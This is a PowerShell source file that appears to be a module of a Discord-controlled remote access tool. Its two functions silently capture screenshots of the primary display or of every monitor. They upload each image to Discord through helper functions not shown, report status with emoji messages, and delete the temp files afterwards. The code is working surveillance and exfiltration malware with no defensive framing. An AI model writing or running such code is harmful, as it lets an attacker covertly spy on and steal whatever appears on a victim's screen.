function screenshot {
    param([string]$quality = "high")
    
    try {
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        
        # Create temp file with timestamp
        $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
        $tempFile = "$env:temp\screenshot_$timestamp.png"
        
        # Get screen dimensions
        $width = Get-CimInstance Win32_VideoController | Select-Object -First 1
        $width = [int]($width.CurrentHorizontalResolution)
        $height = Get-CimInstance Win32_VideoController | Select-Object -First 1
        $height = [int]($height.CurrentVerticalResolution)
        
        # Create bitmap and capture screen
        $bitmap = New-Object System.Drawing.Bitmap $width, $height
        $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphic.CopyFromScreen(0, 0, 0, 0, $bitmap.Size)
        
        # Save with quality settings
        if ($quality -eq "low") {
            # Compress image for smaller file size
            $encoder = [System.Drawing.Imaging.Encoder]::Quality
            $encoderParams = New-Object System.Drawing.Imaging.EncoderParameters(1)
            $encoderParams.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter($encoder, 50L)
            $jpegCodec = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object { $_.MimeType -eq "image/jpeg" }
            $bitmap.Save($tempFile.Replace(".png", ".jpg"), $jpegCodec, $encoderParams)
            $tempFile = $tempFile.Replace(".png", ".jpg")
        } else {
            $bitmap.Save($tempFile, [System.Drawing.Imaging.ImageFormat]::Png)
        }
        
        # Clean up graphics objects
        $graphic.Dispose()
        $bitmap.Dispose()
        
        # Check if file was created successfully
        if (Test-Path $tempFile) {
            $fileSize = [math]::Round((Get-Item $tempFile).Length / 1KB, 2)
            
            # Send file to Discord
            sendFile -sendfilePath $tempFile
            
            # Send info message
            sendMsg -Message ":camera: **Screenshot captured** (Resolution: ${width}x${height}, Size: $fileSize KB)"
            
            # Clean up temp file
            Start-Sleep -Seconds 2  # Give Discord time to process the file
            Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
            
        } else {
            sendMsg -Message ":x: **Failed to create screenshot file**"
        }
        
    } catch {
        sendMsg -Message ":x: **Screenshot error:** $($_.Exception.Message)"
    }
}

function screenshot_all {
    try {
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        
        $screens = [System.Windows.Forms.Screen]::AllScreens
        $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
        
        if ($screens.Count -gt 1) {
            sendMsg -Message ":camera: **Capturing $($screens.Count) monitors...**"
            
            for ($i = 0; $i -lt $screens.Count; $i++) {
                $screen = $screens[$i]
                $tempFile = "$env:temp\screenshot_monitor$($i+1)_$timestamp.png"
                
                if ($screen.Primary) {
                    $width = Get-CimInstance Win32_VideoController | Select-Object -First 1
                    $width = [int]($width.CurrentHorizontalResolution)
                    $height = Get-CimInstance Win32_VideoController | Select-Object -First 1
                    $height = [int]($height.CurrentVerticalResolution)
                    $bitmap = New-Object System.Drawing.Bitmap $width, $height
                    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
                    $graphic.CopyFromScreen(0, 0, 0, 0, $bitmap.Size)
                } else {
                    # Secondary monitors - use Screen bounds
                    $bitmap = New-Object System.Drawing.Bitmap $screen.Bounds.Width, $screen.Bounds.Height
                    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
                    
                    # Secondary monitors - use their actual coordinates
                    $graphic.CopyFromScreen($screen.Bounds.X, $screen.Bounds.Y, 0, 0, $screen.Bounds.Size)
                }
                
                $bitmap.Save($tempFile, [System.Drawing.Imaging.ImageFormat]::Png)
                
                $graphic.Dispose()
                $bitmap.Dispose()
                
                if (Test-Path $tempFile) {
                    $fileSize = [math]::Round((Get-Item $tempFile).Length / 1KB, 2)
                    sendFile -sendfilePath $tempFile
                    
                    # Show which monitor and its position info
                    $isPrimary = if ($screen.Primary) { " (Primary)" } else { "" }
                    if ($screen.Primary) {
                        # For primary monitor, show Win32_VideoController dimensions
                        #sendMsg -Message ":desktop: **Monitor $($i+1)$isPrimary** (${width}x${height}, Position: $($screen.Bounds.X),$($screen.Bounds.Y), $fileSize KB)"
                    } else {
                        # For secondary monitors, show Screen bounds
                        #sendMsg -Message ":desktop: **Monitor $($i+1)$isPrimary** (${screen.Bounds.Width}x${screen.Bounds.Height}, Position: $($screen.Bounds.X),$($screen.Bounds.Y), $fileSize KB)"
                    }
                    
                    Start-Sleep -Seconds 1
                    Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
                }
            }
        } else {
            # Single monitor - use regular screenshot
            screenshot
        }
        
    } catch {
        sendMsg -Message ":x: **Multi-monitor screenshot error:** $($_.Exception.Message)"
    }

}
